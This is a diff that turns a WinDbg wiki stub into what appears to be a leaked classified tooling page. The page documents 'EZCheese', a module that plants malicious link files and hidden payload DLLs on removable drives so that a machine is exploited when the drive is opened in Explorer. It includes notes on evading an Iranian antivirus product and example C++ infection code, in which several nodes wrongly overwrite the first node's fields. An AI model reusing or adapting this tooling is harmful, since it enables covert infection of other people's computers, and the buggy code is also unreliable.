@@ -1,11 +1,245 @@
 
-                        WinDbg
-LABEL PAGE: Child pages of this page will contain articles pertaining to the WinDbg tool for debugging Windows.
+                        Removable Media Link File Execution (EVRemovableMediaLink_EZC - EZCheese)
+SECRET//NOFORN
 
-Sub-Pages:
+OSB Library: Execution Vectors Library  SECRET
+ 
+Removable Media Link File Execution:
+
+PSP/OS Issues:
+Iranian PSPPersonal Security Product (Anti-Virus) Padvish (TAOTailored Access Operation says it gets caught 7/14).
+ 
+('excerpt' missing)
+ 
+Description: Given a path and a linked list of link files to generate, this module creates the link files and dlls on a target drive. When the link files are viewed in explorer the machine is exploited and the architecture specific dll is executed. This module uses the symbolic link strings (universal) for drives that present themselves as DRIVE_FIXED.
+ 
+Notes:
+
+Will not infect drives that present themselves as DRIVE_FIXED.
+May be an issue with some SD cards or SD card readers. If the reader presents itself as the device, the symbolic link will most likely not work.
+Iranian PSPPersonal Security Product (Anti-Virus) Padvish specifically looks for link files on removable media and tends to catch most of them (this method included for now).
+
+ 
+Infect Structure (pvClassStruct):
+enum eOS : unsigned char
+{
+	XPA = 1,
+	XPB = 2,
+	Vista = 3,
+	SevenEight = 4
+};
+ 
+//Note: Architecture is not checked by the code itself and is used only for the user to keep track of what the structure contains
+enum eArch : unsigned char
+{
+	x86 = 0,
+	x64 = 1
+};
+ 
+struct REMOVABLEMEDIALINK_EZC_NODE
+{
+	enum eOS	OS;
+	enum eArch	Arch;
+	WCHAR	*wcLinkName;
+	WCHAR	*wcLinkTarget;
+	LPBYTE	lpbPayload;
+	DWORD	dwPayloadLen;
+	DWORD	dwPayloadAttribs;
+	REMOVABLEMEDIALINK_EZC_NODE *pstNextNode;
+};
+ 
+ 
+ 
+Example Use Code:
+ 
+ 
+VOID EVRemovableMediaLink_EZC_ExampleMain()
+{
+	ExecutionVectors *evVector = new EVIRemovableMediaLink_EZC();
+	
+	//Create Linked List of Options
+	REMOVABLEMEDIALINK_EZC_NODE* pList = NULL;
+
+	//Create Node 1 XPA 32-bit
+	REMOVABLEMEDIALINK_EZC_NODE* pNode1;
+	AllocAndClearNode(pNode1);
+	pNode1->OS = XPA;
+	pNode1->Arch = x86;
+	pNode1->wcLinkName = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode1->wcLinkName, L"XPA.lnk");
+	pNode1->wcLinkTarget = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode1->wcLinkTarget, L"MyFolder\\dllfolder\\32.dll");
+	pNode1->lpbPayload = byPayload32;
+	pNode1->dwPayloadLen = dwPayload32Len;
+	pNode1->dwPayloadAttribs = FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM;
+	AddNode(pList, pNode1);
+
+	//Create Node 2 XPB 32-bit
+	REMOVABLEMEDIALINK_EZC_NODE* pNode2;
+	AllocAndClearNode(pNode2);
+	pNode1->OS = XPB;
+	pNode1->Arch = x86;
+	pNode2->wcLinkName = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode2->wcLinkName, L"XPB.lnk");
+	pNode2->wcLinkTarget = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode2->wcLinkTarget, L"MyFolder\\dllfolder\\32.dll");
+	pNode2->lpbPayload = byPayload32;
+	pNode2->dwPayloadLen = dwPayload32Len;
+	pNode2->dwPayloadAttribs = FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM;
+	AddNode(pList, pNode2);
+
+	//Create Node 3 Vista 32-bit
+	REMOVABLEMEDIALINK_EZC_NODE* pNode3;
+	AllocAndClearNode(pNode3);
+	pNode1->OS = Vista;
+	pNode1->Arch = x86;
+	pNode3->wcLinkName = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode3->wcLinkName, L"Vista32.lnk");
+	pNode3->wcLinkTarget = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode3->wcLinkTarget, L"MyFolder\\dllfolder\\32.dll");
+	pNode3->lpbPayload = byPayload32;
+	pNode3->dwPayloadLen = dwPayload32Len;
+	pNode3->dwPayloadAttribs = FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM;
+	AddNode(pList, pNode3);
+
+	//Create Node 4 Vista 64-bit
+	REMOVABLEMEDIALINK_EZC_NODE* pNode4;
+	AllocAndClearNode(pNode4);
+	pNode1->OS = Vista;
+	pNode1->Arch = x64;
+	pNode4->wcLinkName = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode4->wcLinkName, L"Vista64.lnk");
+	pNode4->wcLinkTarget = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode4->wcLinkTarget, L"MyFolder\\dllfolder\\64.dll");
+	pNode4->lpbPayload = byPayload64;
+	pNode4->dwPayloadLen = dwPayload64Len;
+	pNode4->dwPayloadAttribs = FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM;
+	AddNode(pList, pNode4);
+
+	//Create Node 5 Seven/Eight 32-bit
+	REMOVABLEMEDIALINK_EZC_NODE* pNode5;
+	AllocAndClearNode(pNode5);
+	pNode1->OS = SevenEight;
+	pNode1->Arch = x86;
+	pNode5->wcLinkName = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode5->wcLinkName, L"732.lnk");
+	pNode5->wcLinkTarget = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode5->wcLinkTarget, L"MyFolder\\dllfolder\\32.dll");
+	pNode5->lpbPayload = byPayload32;
+	pNode5->dwPayloadLen = dwPayload32Len;
+	pNode5->dwPayloadAttribs = FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM;
+	AddNode(pList, pNode5);
+
+	//Create Node 6 Seven/Eight 64-bit
+	REMOVABLEMEDIALINK_EZC_NODE* pNode6;
+	AllocAndClearNode(pNode6);
+	pNode1->OS = SevenEight;
+	pNode1->Arch = x64;
+	pNode6->wcLinkName = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode6->wcLinkName, L"764.lnk");
+	pNode6->wcLinkTarget = (WCHAR *) malloc(MAX_PATH);
+	wsprintf(pNode6->wcLinkTarget, L"MyFolder\\dllfolder\\64.dll");
+	pNode6->lpbPayload = byPayload64;
+	pNode6->dwPayloadLen = dwPayload64Len;
+	pNode6->dwPayloadAttribs = FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM;
+	AddNode(pList, pNode6);
 
 
-WinDbg Cheat Sheet 
+	//Infect the following path
+	ExVecErr evRet = evVector->Infect(L"E:\\test\\createdir", pList);
+
+	//Print success or fail
+	if(SUCCEEDED(evRet)) printf("Success!\n");
+	else printf("Failed!\n");
+
+	//Cleanup Linked List
+	ClearList(pList);
+
+	delete evVector;
+
+	return;
+}
+
+BOOL AllocAndClearNode(REMOVABLEMEDIALINK_EZC_NODE* &pNode)
+{
+	//Allocates memory for (and zeros out) a node
+	pNode = NULL;
+	pNode = (REMOVABLEMEDIALINK_EZC_NODE*) malloc(sizeof(REMOVABLEMEDIALINK_EZC_NODE));
+	SecureZeroMemory(pNode, sizeof(REMOVABLEMEDIALINK_EZC_NODE));
+
+	return TRUE;
+}
+
+BOOL AddNode(REMOVABLEMEDIALINK_EZC_NODE* &pList, REMOVABLEMEDIALINK_EZC_NODE* pNode)
+{
+	//Add a node to the list
+	if(pNode == NULL) return FALSE;
+
+	//point the next node at the beginning of the list
+	pNode->pstNextNode = pList;
+	pList = pNode; //reset head of list to the new node
+
+	return TRUE;
+}
+
+BOOL ClearList(REMOVABLEMEDIALINK_EZC_NODE* &pList)
+{
+	//Cleanup the linked list
+	if(pList == NULL) return TRUE;
+
+	REMOVABLEMEDIALINK_EZC_NODE* pCurrentNode = pList;
+	while(pCurrentNode != NULL)
+	{
+		//Free all data in the struct
+		/*if(pCurrentNode->lpbPayload) free(pCurrentNode->lpbPayload);*/
+		if(pCurrentNode->wcLinkName) free(pCurrentNode->wcLinkName); 
+		if(pCurrentNode->wcLinkTarget) free(pCurrentNode->wcLinkTarget);
+
+		SecureZeroMemory(pCurrentNode, sizeof(REMOVABLEMEDIALINK_EZC_NODE)); //Clear the struct
+
+		//free the node
+		REMOVABLEMEDIALINK_EZC_NODE* pTempNode = pCurrentNode;
+		pCurrentNode = pCurrentNode->pstNextNode;
+		free(pTempNode);
+	}
+
+	pList = NULL;
+
+	return TRUE;
+}
 
 
+
+ 
+ 
+ 
+ 
+ 
+SECRET//NOFORN
+
+Previous versions:
+| 1 SECRET
+| 2 SECRET
+| 3 SECRET
+| 4 SECRET
+| 5 SECRET
+| 6 SECRET
+| 7 SECRET
+| 8 SECRET
+| 9 SECRET
+| 10 SECRET
+| 11 SECRET
+| 12 SECRET
+| 13 SECRET
+| 14 SECRET
+| 15 SECRET
+| 16 SECRET
+| 17 SECRET
+| 18 SECRET
+| 19 SECRET
+| 20 SECRET
+| 21 SECRET
+| 22 SECRET
+| 23 SECRET
+|
                     
